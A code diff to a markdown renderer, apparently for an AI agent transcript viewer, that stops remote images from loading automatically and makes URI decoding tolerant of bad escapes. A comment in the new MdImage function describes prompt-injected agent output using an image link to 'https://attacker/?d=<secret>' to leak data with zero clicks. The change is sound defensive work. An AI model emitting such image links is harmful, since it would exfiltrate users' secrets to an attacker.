@@ -149,7 +149,14 @@ function MdLink({ href, children }: { href?: string; children?: ReactNode }) {
   const { workspace } = useTranscript()
   if (!href) return <span>{children}</span>
   if (href.startsWith(FILE_PROTOCOL)) {
-    return <FileLink raw={decodeURIComponent(href.slice(FILE_PROTOCOL.length))}>{children}</FileLink>
+    // Model output can contain a literal `atom-file:` link with a bad escape (`%FF`): never throw during render.
+    let raw = href.slice(FILE_PROTOCOL.length)
+    try {
+      raw = decodeURIComponent(raw)
+    } catch {
+      /* keep the raw text; parseFileRef tolerates it */
+    }
+    return <FileLink raw={raw}>{children}</FileLink>
   }
   if (/^(https?:|mailto:)/i.test(href)) {
     return (
@@ -182,6 +189,42 @@ function MdLink({ href, children }: { href?: string; children?: ReactNode }) {
     )
   }
   return <span className="text-accent">{children}</span>
+}
+
+/**
+ * Images: only inline `data:image/` sources render. Remote images are never fetched automatically — agent output
+ * can be steered by prompt injection, and an auto-loading `![](https://attacker/?d=<secret>)` would leak data
+ * with zero clicks. They show as a placeholder that opens in the system browser on an explicit click.
+ */
+function MdImage({ src, alt }: { src?: string; alt?: string }) {
+  const label = alt ? `[image: ${alt}]` : '[image]'
+  if (src && /^data:image\//i.test(src)) {
+    return <img src={src} alt={alt ?? ''} className="my-2 max-h-[320px] max-w-full rounded-md border border-line" />
+  }
+  if (src && /^https?:/i.test(src)) {
+    const open = (e: { currentTarget: HTMLElement; preventDefault(): void; stopPropagation(): void }): void => {
+      // An image inside a link ([![badge](…)](url)): the link handles the click.
+      if (e.currentTarget.parentElement?.closest('a')) return
+      e.preventDefault()
+      e.stopPropagation()
+      void atom.app.openExternal(src)
+    }
+    return (
+      <span
+        role="link"
+        tabIndex={0}
+        title={`Remote image (not loaded) — open ${src} in the browser`}
+        onClick={open}
+        onKeyDown={(e) => {
+          if (e.key === 'Enter') open(e)
+        }}
+        className="cursor-pointer text-accent hover:underline"
+      >
+        {label}
+      </span>
+    )
+  }
+  return <span className="text-muted">{label}</span>
 }
 
 function InlineCode({ children }: { children?: ReactNode }) {
@@ -381,12 +424,7 @@ const COMPONENTS: Components = {
       <table className="!my-0">{children}</table>
     </div>
   ),
-  img: ({ src, alt }) =>
-    typeof src === 'string' && /^(https?:|data:image\/)/.test(src) ? (
-      <img src={src} alt={alt ?? ''} className="my-2 max-h-[320px] max-w-full rounded-md border border-line" />
-    ) : (
-      <span className="text-muted">{alt ? `[image: ${alt}]` : '[image]'}</span>
-    ),
+  img: ({ src, alt }) => <MdImage src={typeof src === 'string' ? src : undefined} alt={alt} />,
   input: ({ type, checked }) =>
     type === 'checkbox' ? (
       <input type="checkbox" checked={!!checked} readOnly className="mr-1.5 translate-y-[1px] accent-[var(--accent)]" />
